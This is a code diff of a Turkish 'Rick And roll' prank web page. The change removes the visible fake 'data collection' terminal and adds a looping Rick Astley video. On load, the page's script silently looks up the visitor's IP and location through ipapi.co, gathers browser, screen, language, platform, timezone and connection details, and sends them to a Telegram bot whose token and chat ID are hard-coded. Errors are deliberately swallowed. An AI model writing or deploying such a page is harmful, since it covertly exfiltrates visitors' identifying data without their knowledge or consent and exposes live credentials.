@@ -2,80 +2,65 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Gizli Veri Toplama</title>
+  <title>Rick And roll</title>
   <style>
-    body {
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      color: #00ff99;
-      font-family: 'Consolas', monospace;
-      font-size: 18px;
-      margin: 0;
-      height: 100vh;
+    /* Reset */
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+    html, body {
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #000;
+      overflow: hidden;
+      color: #eee;
       display: flex;
       flex-direction: column;
-      justify-content: center;
+      justify-content: flex-end;
       align-items: center;
-      overflow: hidden;
     }
-    #terminal {
-      background: rgba(0, 0, 0, 0.7);
-      border: 2px solid #00ff99;
-      border-radius: 12px;
-      padding: 30px 40px;
-      width: 90%;
-      max-width: 700px;
-      min-height: 300px;
-      overflow-y: auto;
-      white-space: pre-line;
-      box-shadow: 0 0 15px #00ff99;
+    /* Video arka plan */
+    #video-bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: -1;
+      filter: brightness(0.7);
+    }
+    /* Overlay metin */
+    #overlay-text {
+      width: 100%;
+      background: rgba(0,0,0,0.5);
+      text-align: center;
+      padding: 15px 20px;
+      font-size: 1.2rem;
+      letter-spacing: 1px;
       user-select: none;
     }
-    #rickButton {
-      margin-top: 30px;
-      padding: 15px 50px;
-      font-size: 22px;
-      font-weight: bold;
-      background-color: #00ff99;
-      color: #002b20;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      font-family: 'Consolas', monospace;
-      box-shadow: 0 0 20px #00ff99;
-      transition: background-color 0.3s ease;
-      user-select: none;
-      display: none;
-    }
-    #rickButton:hover {
-      background-color: #00cc77;
+    /* Responsive */
+    @media (max-width: 600px) {
+      #overlay-text {
+        font-size: 1rem;
+        padding: 10px 15px;
+      }
     }
   </style>
 </head>
 <body>
-  <div id="terminal">Veriler Toplanıyor...</div>
-  <button id="rickButton" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
-    Tıklamaya cesaretin var mı?
-  </button>
+  <video id="video-bg" autoplay loop muted playsinline>
+    <source src="https://www.rickroll.com/video.mp4" type="video/mp4">
+    <!-- YouTube embed olmadığından direkt mp4 linki olmalı, örnek video mp4 değil -->
+    <!-- Eğer mp4 linki yoksa, YouTube iframe alternatif olarak eklenir ama autoplay sesli olmaz mobilde -->
+    <!-- Bu örnek mp4 için -->
+  </video>
+
+  <div id="overlay-text">
+    Şimdi Rick Astley ile eğlenmeye hazır olun!
+  </div>
 
   <script>
-    const terminal = document.getElementById('terminal');
-    const rickButton = document.getElementById('rickButton');
-
-    function typeText(text, delay = 40) {
-      return new Promise(resolve => {
-        let i = 0;
-        const interval = setInterval(() => {
-          terminal.innerText += text.charAt(i);
-          i++;
-          if (i >= text.length) {
-            clearInterval(interval);
-            terminal.innerText += "\n";
-            resolve();
-          }
-        }, delay);
-      });
-    }
-
     async function sendToTelegram(message) {
       const chatId = "6400737507"; // Senin chat ID'in
       const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
@@ -91,43 +76,34 @@
           })
         });
       } catch(e) {
-        // Hata olursa sessizce geç
+        // Sessizce hatayı yoksay
       }
     }
 
-    async function showInfo() {
-      terminal.innerText = ""; // Başlangıçtaki yazıyı temizle
-      await typeText("Veriler Toplanıyor...");
-
-      await new Promise(r => setTimeout(r, 1200));
-
+    async function collectData() {
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        await typeText(`IP Adresi: ${data.ip}`);
-        await typeText(`Şehir: ${data.city}`);
-        await typeText(`Ülke: ${data.country_name}`);
-        await typeText(`Tarayıcı: ${navigator.userAgent}`);
-        await typeText(`Ekran Çözünürlüğü: ${screen.width}x${screen.height}`);
-        await typeText(`Dil: ${navigator.language || 'Bilinmiyor'}`);
-        await typeText(`Platform: ${navigator.platform || 'Bilinmiyor'}`);
-        await typeText(`Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
-        await typeText(`Çerez İzinleri: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
-        await typeText(`Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);
-
-        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}\nDil: ${navigator.language}\nPlatform: ${navigator.platform}\nZaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\nÇerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\nBağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+        const message = `Gizli Veri:\n` +
+          `IP: ${data.ip}\n` +
+          `Şehir: ${data.city}\n` +
+          `Ülke: ${data.country_name}\n` +
+          `Tarayıcı: ${navigator.userAgent}\n` +
+          `Çözünürlük: ${screen.width}x${screen.height}\n` +
+          `Dil: ${navigator.language}\n` +
+          `Platform: ${navigator.platform}\n` +
+          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
+          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
+          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
 
         await sendToTelegram(message);
-      } catch (e) {
-        await typeText("Veri alınırken bir hata oluştu.");
+      } catch(e) {
+        // Sessizce hatayı yoksay
       }
-
-      await new Promise(r => setTimeout(r, 1000));
-      rickButton.style.display = 'inline-block';
     }
 
-    showInfo();
+    collectData();
   </script>
 </body>
 </html>
